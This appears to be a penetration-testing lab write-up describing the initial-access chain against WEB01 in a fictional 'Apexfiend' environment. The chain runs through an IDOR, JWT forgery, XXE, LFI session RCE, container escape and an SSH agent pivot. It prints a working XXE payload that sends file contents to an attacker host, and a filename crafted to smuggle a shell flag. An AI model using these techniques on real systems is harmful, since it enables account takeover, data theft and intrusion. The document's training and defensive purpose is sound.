# Apexfiend — Initial Access (WEB01)

## 1. Purpose

This document narrates the confirmed, tested initial-access chain against `WEB01` (`01-architecture/system-inventory.md`; `04-web-and-collaboration/web01.md`), from first contact with the public decoy site through to a foothold as the `dev` user on the host itself. It is the reasoning-level counterpart to the full raw transcript, which belongs in `writeups/` once finalized. Scope ends where `web-to-vpn.md` begins: the discovery of a live, forwarded SSH agent socket on `WEB01`.

## 2. Reconnaissance

The public decoy site (`https://www.apexfiend.lab/`, `web01.md` Section 8) advertises four endpoints: `webmail.apexfiend.lab`, `register/index.php`, `portal.apexfiend.lab`, `job.apexfiend.lab`. `portal.apexfiend.lab` requires an account, gated behind email verification — so the chain begins by registering a disposable mailbox (`register/index.php`, on the `apex-guest.lab` domain — the webmail service's own namespace, distinct from `apexfiend.lab`) and using it to confirm a newly created `portal.apexfiend.lab` account.

## 3. Account Takeover via IDOR + Forged Reset Token

With a low-privilege portal account established (entity ID `#USR-0032`), two chained flaws lead to full `admin` account takeover:

1. **IDOR in the TOTP QR endpoint.** The `GET /get_qr.php` request includes a header, `X-Target-Hash`, which the client sends as an MD5 hash of the requester's own numeric user ID. Because the server does not independently derive this value from the authenticated session — it trusts the client-supplied hash — an attacker can compute `md5(1)` and submit it instead, retrieving user ID `1`'s TOTP QR code directly. User ID `1` is `admin`.
2. **Unverified JWT on the password-reset flow.** The portal's "forgot password" flow requires the username and a valid TOTP code — satisfiable for `admin` using the leaked QR from step 1. The reset link itself carries a JWT (`user_id`, `username`, `iat`, `exp`) whose signature is **not actually validated on resubmission**: editing the payload to `{"user_id":1,"username":"admin",...}` while reusing the original signature is accepted by the server. Combined with the TOTP code already available, this completes a full account-takeover of `admin` with a self-chosen password.

This sequence — a numeric-ID IDOR feeding a self-service password-reset flow with broken JWT verification — is a realistic, commonly-seen web application vulnerability chain, not a contrived CTF trick.

## 4. XXE → Source Disclosure → RCE

Separately, the portal's SVG upload feature (profile avatar) is vulnerable to XXE. An uploaded SVG referencing an external DTD, combined with a PHP `php://filter/convert.base64-encode` wrapper, discloses arbitrary local file contents out-of-band to an attacker-controlled HTTP listener:

```xml
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://<attacker>/remote.dtd"> %remote;
]>
```

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/portal/includes/config.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<attacker>/?data=%file;'>">
%eval;
%exfil;
```

Reading `config.php` discloses internal route names (`preview_profile.php`, `test_svg_upload.php`, `admin.php`, `logger_dump.php`) and feature flags, but not (in this pass) full database credentials. `preview_profile.php?file=...` turns out to be a **Local File Inclusion** endpoint. Combined with the profile "biography" field (user-controlled, stored server-side) accepting embedded PHP, and knowledge of one's own `PHPSESSID`, this becomes RCE via **PHP session file inclusion**: writing a PHP payload into the biography field causes it to be persisted inside the session file on disk (`/var/lib/php/sessions/sess_<PHPSESSID>`), which the LFI endpoint can then be made to traverse to and include, executing the payload as `www-data` inside the portal's container.

## 5. Container Escape to the Host (dev)

The initial shell lands as `www-data` **inside a Docker container** (`web01.md`, Section 7 already documented `portal.apexfiend.lab`'s backend as containerized). Escaping to the underlying host is achieved through a separate flaw: the upload handling accepts filenames that are interpreted as shell arguments rather than pure data when processed — specifically, a filename of the form `-e sh test.svg` (created via `touch -- '-e sh test.svg'`) causes a host-side process, running as `dev`, to interpret the leading `-e` as a flag rather than part of the filename, resulting in execution of attacker-controlled content as `dev` **on the host itself**, outside the container.

## 6. Host Enumeration and Git Secret Recovery

As `dev` on `WEB01`, a cloned repository is found at `/opt/dashboard/internal-dashboard` — the same repository confirmed public in `04-web-and-collaboration/gitea.md` as `dev/internal-dashboard`. `git fsck --unreachable` against it surfaces a **dangling commit** (one removed from history but not yet garbage-collected) containing a hardcoded Gitea API token, left in a commit message literally noting "remove before merge." This is a realistic and common real-world finding: deleting a commit from a branch does not remove it from the repository's object store until garbage collection runs.

The recovered token is valid and grants API access as `dev`, revealing (and permitting cloning of) the private `dev/developer-deployment` repository — the second of `dev`'s two Gitea repositories noted as "not yet documented" in `gitea.md`, now resolved: it is a deployment-configuration repo whose git history documents `DEV-LAPTOP` (`10.0.100.12`) as the remote development target, explicitly noting that "authentication relies on forwarded ssh-agent sockets" rather than stored private keys — essentially a breadcrumb pointing directly at the next pivot technique.

## 7. Transition to web-to-vpn.md

With `dev`'s own SSH agent-forwarding behavior now understood from the repository history, enumeration of `/tmp/ssh-*/agent.*` on `WEB01` locates a live forwarded-agent socket (these rotate over time, consistent with `dev` periodically SSHing in from `DEV-LAPTOP` with agent forwarding enabled — matching `AllowAgentForwarding yes`, confirmed in `web01.md`, Section 2). Pointing `SSH_AUTH_SOCK` at that socket and listing its identities confirms a key for `developer@DEV-LAPTOP`, which is then used to SSH outbound to `10.0.100.12` — reaching `DEV-LAPTOP` without ever obtaining `dev`'s private key. This is where `web-to-vpn.md` picks up.

## 8. Validation Status

| Item | Status |
|---|---|
| IDOR (`X-Target-Hash`) and reset-token JWT forgery chain | Tested and confirmed |
| XXE → config.php disclosure → LFI → session-file RCE chain | Tested and confirmed |
| Container-to-host escape via filename argument injection | Tested and confirmed |
| Git dangling-commit secret recovery | Tested and confirmed |
| Forwarded-agent socket pivot to DEV-LAPTOP | Tested and confirmed |

## 9. Related Documentation

- `web-to-vpn.md` — Continuation: DEV-LAPTOP → VPN → WK01
- `../04-web-and-collaboration/web01.md` — Infrastructure this chain runs against
- `../04-web-and-collaboration/gitea.md` — The two `dev`-owned repositories resolved by this chain
- `../00-overview/attack-path.md` — Stage 1 (kept intentionally general; this document is the detailed counterpart)